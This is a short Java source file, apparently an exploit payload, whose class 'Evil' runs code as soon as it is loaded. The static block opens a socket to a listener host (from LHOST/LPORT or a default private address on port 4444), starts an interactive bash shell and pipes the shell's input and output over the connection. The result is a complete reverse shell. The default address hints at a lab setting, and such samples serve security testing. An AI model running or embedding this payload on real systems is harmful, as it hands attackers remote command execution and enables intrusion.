import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Evil {
    static {
        try {
            String host = System.getenv("LHOST") != null ? System.getenv("LHOST") : "172.26.0.10";
            int port = System.getenv("LPORT") != null ? Integer.parseInt(System.getenv("LPORT")) : 4444;
            Socket s = new Socket(host, port);
            Process p = new ProcessBuilder("/bin/bash", "-i")
                .redirectErrorStream(true)
                .start();
            InputStream pi = p.getInputStream();
            OutputStream po = p.getOutputStream();
            InputStream si = s.getInputStream();
            OutputStream so = s.getOutputStream();
            Thread t1 = new Thread(() -> {
                try {
                    byte[] buf = new byte[1024];
                    int len;
                    while ((len = pi.read(buf)) != -1) so.write(buf, 0, len);
                } catch (IOException ignored) {}
            });
            Thread t2 = new Thread(() -> {
                try {
                    byte[] buf = new byte[1024];
                    int len;
                    while ((len = si.read(buf)) != -1) { po.write(buf, 0, len); po.flush(); }
                } catch (IOException ignored) {}
            });
            t1.start();
            t2.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
